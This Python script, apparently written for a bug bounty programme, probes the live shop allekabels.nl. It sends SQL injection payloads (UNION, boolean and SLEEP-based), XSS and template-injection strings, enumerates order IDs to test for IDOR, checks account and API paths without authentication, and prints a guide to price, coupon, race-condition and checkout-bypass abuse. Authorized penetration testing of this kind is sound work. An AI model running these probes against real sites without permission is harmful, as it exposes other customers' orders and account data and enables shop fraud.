#!/usr/bin/env python3
"""
Allekabels.nl Bug Bounty - Targeted Test Cases
Run these AFTER initial recon, using authenticated sessions.

Requirements: pip install requests
Usage: python3 burp_test_cases.py --cookie "your_session_cookie"
"""

import requests
import time
import json
import argparse
import re
from urllib.parse import urljoin, quote

BASE_URL = "https://www.allekabels.nl"
DELAY = 0.3  # Under 5 req/sec


def make_session(cookie_str):
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    if cookie_str:
        s.headers["Cookie"] = cookie_str
    return s


# ============================================================
# TEST 1: IDOR on numeric IDs
# ============================================================
def test_idor_numeric(session, endpoint, id_param, your_id):
    """
    Test IDOR by accessing adjacent IDs.
    Example: test_idor_numeric(s, "/api/orders/", "id", 12345)
    """
    print(f"\n[IDOR] Testing {endpoint} with IDs around {your_id}")

    test_ids = [
        your_id - 1,
        your_id + 1,
        your_id - 10,
        your_id + 10,
        1,  # first record
        0,  # edge case
    ]

    for test_id in test_ids:
        time.sleep(DELAY)
        url = f"{BASE_URL}{endpoint}{test_id}"
        try:
            resp = session.get(url, timeout=10, allow_redirects=False)
            print(f"  ID={test_id}: HTTP {resp.status_code} ({len(resp.content)} bytes)")
            if resp.status_code == 200:
                print(f"    [!] POTENTIAL IDOR - Got 200 for ID {test_id}")
                # Check if response contains other user's data
                try:
                    data = resp.json()
                    print(f"    Response keys: {list(data.keys())[:10]}")
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            print(f"  ID={test_id}: Error - {e}")


# ============================================================
# TEST 2: SQL injection on parameters
# ============================================================
def test_sqli_param(session, url, param_name):
    """
    Test a specific parameter for SQL injection.
    Example: test_sqli_param(s, "/search", "q")
    """
    print(f"\n[SQLi] Testing parameter '{param_name}' at {url}")

    payloads = [
        ("Baseline", "test"),
        ("Single quote", "test'"),
        ("Double quote", 'test"'),
        ("Boolean true", "test' AND '1'='1"),
        ("Boolean false", "test' AND '1'='2"),
        ("Comment", "test'--"),
        ("UNION 1 col", "' UNION SELECT NULL--"),
        ("UNION 2 cols", "' UNION SELECT NULL,NULL--"),
        ("UNION 3 cols", "' UNION SELECT NULL,NULL,NULL--"),
        ("Time-based 3s", "test' AND SLEEP(3)--"),
        ("Stacked", "test'; SELECT 1--"),
    ]

    baseline_len = None
    baseline_status = None

    for name, payload in payloads:
        time.sleep(DELAY)
        try:
            resp = session.get(
                f"{BASE_URL}{url}",
                params={param_name: payload},
                timeout=15,
                allow_redirects=True
            )
            elapsed = resp.elapsed.total_seconds()
            size = len(resp.content)

            if name == "Baseline":
                baseline_len = size
                baseline_status = resp.status_code

            indicator = ""
            if resp.status_code == 500:
                indicator = " <-- SERVER ERROR!"
            elif resp.status_code != baseline_status:
                indicator = f" <-- STATUS CHANGED from {baseline_status}!"
            elif baseline_len and abs(size - baseline_len) > 500:
                indicator = f" <-- SIZE DIFF: {size - baseline_len:+d} bytes!"
            elif elapsed > 3 and "SLEEP" in name.upper():
                indicator = f" <-- DELAYED {elapsed:.1f}s - POSSIBLE TIME-BASED!"

            # Check for SQL error messages
            sql_errors = [
                "mysql", "syntax error", "unclosed quotation",
                "sql", "ORA-", "PG::Error", "SQLite",
                "microsoft jet", "ODBC", "unterminated",
            ]
            for err in sql_errors:
                if err.lower() in resp.text.lower():
                    indicator += f" <-- SQL ERROR KEYWORD: '{err}'!"

            print(f"  [{name}]: HTTP {resp.status_code}, {size} bytes, {elapsed:.2f}s{indicator}")

        except requests.Timeout:
            print(f"  [{name}]: TIMEOUT (possible time-based injection!)")
        except Exception as e:
            print(f"  [{name}]: Error - {e}")


# ============================================================
# TEST 3: XSS reflection check
# ============================================================
def test_xss_reflection(session, url, param_name):
    """
    Test for reflected XSS on a parameter.
    """
    print(f"\n[XSS] Testing parameter '{param_name}' at {url}")

    payloads = [
        ("Canary", "XSS_CANARY_98765"),
        ("HTML tags", "<b>BOLD_TEST</b>"),
        ("Script", "<script>alert(1)</script>"),
        ("Img onerror", '<img src=x onerror=alert(1)>'),
        ("SVG", '<svg onload=alert(1)>'),
        ("Event in attr", '" autofocus onfocus=alert(1) x="'),
        ("Template", "{{7*7}}"),
        ("SSTI Jinja", "{{config}}"),
    ]

    for name, payload in payloads:
        time.sleep(DELAY)
        try:
            resp = session.get(
                f"{BASE_URL}{url}",
                params={param_name: payload},
                timeout=10
            )

            if payload in resp.text:
                print(f"  [{name}]: REFLECTED UNENCODED in response!")
                # Find context
                idx = resp.text.index(payload)
                context = resp.text[max(0,idx-50):idx+len(payload)+50]
                print(f"    Context: ...{context}...")
            elif payload.replace("<", "&lt;").replace(">", "&gt;") in resp.text:
                print(f"  [{name}]: reflected but HTML-encoded (safe)")
            elif "49" in resp.text and "7*7" in payload:
                print(f"  [{name}]: TEMPLATE INJECTION - 7*7=49 found!")
            else:
                print(f"  [{name}]: not reflected")

        except Exception as e:
            print(f"  [{name}]: Error - {e}")


# ============================================================
# TEST 4: Authentication bypass checks
# ============================================================
def test_auth_bypass(session):
    """
    Check for endpoints accessible without auth or with modified auth.
    """
    print("\n[AUTH] Testing authentication bypass")

    # Test without cookies
    anon = requests.Session()
    anon.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    })

    protected_paths = [
        "/account",
        "/account/orders",
        "/account/addresses",
        "/account/settings",
        "/account/wishlist",
        "/api/user/me",
        "/api/account",
        "/api/orders",
    ]

    for path in protected_paths:
        time.sleep(DELAY)
        url = f"{BASE_URL}{path}"
        try:
            # Authenticated request
            auth_resp = session.get(url, timeout=10, allow_redirects=False)
            # Anonymous request
            time.sleep(DELAY)
            anon_resp = anon.get(url, timeout=10, allow_redirects=False)

            auth_status = auth_resp.status_code
            anon_status = anon_resp.status_code

            if anon_status == 200 and auth_status == 200:
                if len(anon_resp.content) > 500:
                    print(f"  [!] {path}: ACCESSIBLE WITHOUT AUTH (200, {len(anon_resp.content)} bytes)")
                else:
                    print(f"  [?] {path}: 200 but small response - check content")
            elif anon_status in (301, 302, 303, 307):
                loc = anon_resp.headers.get("Location", "?")
                print(f"  [OK] {path}: Redirects to {loc} (auth required)")
            elif anon_status in (401, 403):
                print(f"  [OK] {path}: Properly blocked ({anon_status})")
            else:
                print(f"  [?] {path}: Auth={auth_status}, Anon={anon_status}")

        except Exception as e:
            print(f"  [ERR] {path}: {e}")


# ============================================================
# TEST 5: Price/Cart manipulation
# ============================================================
def test_business_logic_guide():
    """
    Guide for testing business logic flaws.
    """
    print("\n[BIZ] Business Logic Testing Guide")
    print("""
    These tests require Burp Suite to intercept and modify requests.

    1. PRICE MANIPULATION
       - Add item to cart, intercept the request
       - Look for price parameters in the request body
       - Try: negative price, 0 price, 0.01 price
       - Try: modifying quantity to negative number
       - Check if price is validated server-side

    2. COUPON/DISCOUNT ABUSE
       - Apply a coupon code
       - Try applying the same coupon twice
       - Try applying multiple different coupons
       - Try: coupon for more than order total
       - Check coupon in URL parameters

    3. RACE CONDITIONS
       - Use Burp's Turbo Intruder or repeater
       - Send multiple checkout requests simultaneously
       - Test coupon application race condition
       - Test stock depletion race condition

    4. CURRENCY/LOCALE MANIPULATION
       - Check if changing locale affects pricing
       - Try different Accept-Language headers
       - Look for currency conversion logic

    5. ORDER FLOW BYPASS
       - Try to skip steps in checkout
       - Access order confirmation without payment
       - Modify order after placement
       - Cancel order after shipment

    6. PARAMETER POLLUTION
       - Send same parameter twice with different values
       - Example: price=100&price=1
       - Check which value the server uses
    """)


# ============================================================
# MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Allekabels Bug Bounty Test Cases")
    parser.add_argument("--cookie", help="Session cookie string", default="")
    parser.add_argument("--test", help="Test to run: idor|sqli|xss|auth|biz|all", default="all")
    parser.add_argument("--url", help="URL path to test", default="/search")
    parser.add_argument("--param", help="Parameter name to test", default="q")
    parser.add_argument("--id", help="Your known valid ID for IDOR testing", type=int, default=1)
    parser.add_argument("--endpoint", help="IDOR endpoint path", default="/api/orders/")
    args = parser.parse_args()

    session = make_session(args.cookie)

    print("""
╔══════════════════════════════════════════════════════════╗
║  Allekabels.nl - Targeted Vulnerability Test Cases       ║
║  Researcher: ramjiapi049                                 ║
║  WARNING: Only test with authorization!                  ║
╚══════════════════════════════════════════════════════════╝
    """)

    if args.test in ("sqli", "all"):
        test_sqli_param(session, args.url, args.param)

    if args.test in ("xss", "all"):
        test_xss_reflection(session, args.url, args.param)

    if args.test in ("auth", "all"):
        test_auth_bypass(session)

    if args.test in ("idor", "all"):
        test_idor_numeric(session, args.endpoint, "id", args.id)

    if args.test in ("biz", "all"):
        test_business_logic_guide()


if __name__ == "__main__":
    main()
